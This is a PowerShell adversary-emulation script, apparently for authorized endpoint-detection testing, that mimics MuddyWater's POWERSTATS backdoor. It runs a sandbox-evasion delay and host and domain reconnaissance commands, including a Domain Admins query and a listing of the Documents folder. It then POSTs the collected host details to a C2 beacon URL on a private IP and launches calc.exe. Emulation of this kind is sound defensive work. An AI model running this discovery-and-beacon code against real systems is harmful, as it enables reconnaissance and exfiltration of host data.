# ============================================================================
# ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
#
# This code replicates documented malware behavior for defensive security
# testing and endpoint telemetry validation. It does NOT contain real malware
# payloads, exploits, or evasion techniques.
#
# LEGAL: Only run this in environments you own or have explicit written
# authorization to test. Unauthorized use may violate computer fraud laws.
#
# Final payload: calc.exe (safe, benign)
# C2: Local network only (hardcoded private IP: 192.168.0.148)
# ============================================================================
#
# MuddyCalc Stage 3 — POWERSTATS Backdoor Emulation
# Emulates: MuddyWater POWERSTATS v1/v3 (CISA AA22-055A, MITRE S0223)
#
# Real POWERSTATS is a PowerShell-based first-stage backdoor used by
# MuddyWater since at least 2017. It collects system information and
# sends it to C2, then executes commands received from C2.
#
# We emulate the discovery + beacon phase. The "command" from C2 is
# always calc.exe (safe payload).
#
# MITRE ATT&CK:
#   T1059.001 — Command and Scripting Interpreter: PowerShell
#   T1497.003 — Virtualization/Sandbox Evasion: Time Based
#   T1033     — System Owner/User Discovery
#   T1082     — System Information Discovery
#   T1016     — System Network Configuration Discovery
#   T1057     — Process Discovery
#   T1069.002 — Permission Groups Discovery: Domain Groups
#   T1083     — File and Directory Discovery
#   T1071.001 — Application Layer Protocol: Web Protocols
# ============================================================================

# --- Anti-analysis delay (T1497.003) ---
# Real POWERSTATS checks for sandbox artifacts via WMI queries
# (e.g., Win32_ComputerSystem model contains "virtual", MAC address
# prefixes for common hypervisors). We simplify to a timed delay.
Start-Sleep -Seconds 3

# --- Discovery burst ---
# Real POWERSTATS collects system information and sends it to C2 before
# receiving commands. Each command below spawns as a cmd.exe child process
# to maximize telemetry visibility for endpoint detection tools.

$discoveryResults = @{}

# T1033 — System Owner/User Discovery
# MuddyWater collects the current username to identify high-value targets
$discoveryResults["whoami"] = (cmd.exe /c whoami 2>&1) | Out-String

# T1082 — System Information Discovery
# POWERSTATS collects OS version, architecture, domain membership
$discoveryResults["systeminfo"] = (cmd.exe /c systeminfo 2>&1) | Out-String

# T1016 — System Network Configuration Discovery
# Network adapter info helps MuddyWater map the target environment
$discoveryResults["ipconfig"] = (cmd.exe /c "ipconfig /all" 2>&1) | Out-String

# T1057 — Process Discovery
# Running process list used to identify security tools (AV, EDR)
$discoveryResults["tasklist"] = (cmd.exe /c tasklist 2>&1) | Out-String

# T1069.002 — Permission Groups Discovery: Domain Groups
# MuddyWater targets domain admin accounts for lateral movement
$discoveryResults["domain_admins"] = (cmd.exe /c 'net group "Domain Admins" /domain' 2>&1) | Out-String

# T1083 — File and Directory Discovery
# Document enumeration for data staging / exfiltration targets
$discoveryResults["documents"] = (cmd.exe /c "dir %USERPROFILE%\Documents" 2>&1) | Out-String

# --- C2 Beacon (T1071.001 — Application Layer Protocol: Web) ---
# Real POWERSTATS beacons to compromised web servers or cloud storage
# (OneDrive, Sharepoint). We beacon to a local HTTP server.
$C2_URL = "http://192.168.0.148:8888/beacon"

$beacon = @{
    hostname  = $env:COMPUTERNAME
    username  = $env:USERNAME
    pid       = $PID
    stage     = "powerstats_complete"
    discovery = @{
        whoami = ($discoveryResults["whoami"]).Trim()
        ip     = (Get-NetIPAddress -AddressFamily IPv4 |
                  Where-Object { $_.IPAddress -ne "127.0.0.1" } |
                  Select-Object -First 1).IPAddress
    }
} | ConvertTo-Json -Depth 3

try {
    Invoke-WebRequest -Uri $C2_URL -Method POST -Body $beacon `
        -ContentType "application/json" -UseBasicParsing `
        -ErrorAction SilentlyContinue
} catch {
    # Beacon failure is non-fatal — continue to payload
    # In real POWERSTATS, C2 failure triggers retry with backoff
}

# --- Final payload (SAFE) ---
# In real POWERSTATS, C2 sends arbitrary commands via .cmd files or
# encoded PowerShell scripts. The operator typically deploys additional
# tools (Mimikatz, LaZagne, credential dumpers) at this stage.
#
# We launch calc.exe as a safe, visible indicator of successful execution.
Start-Process "calc.exe"
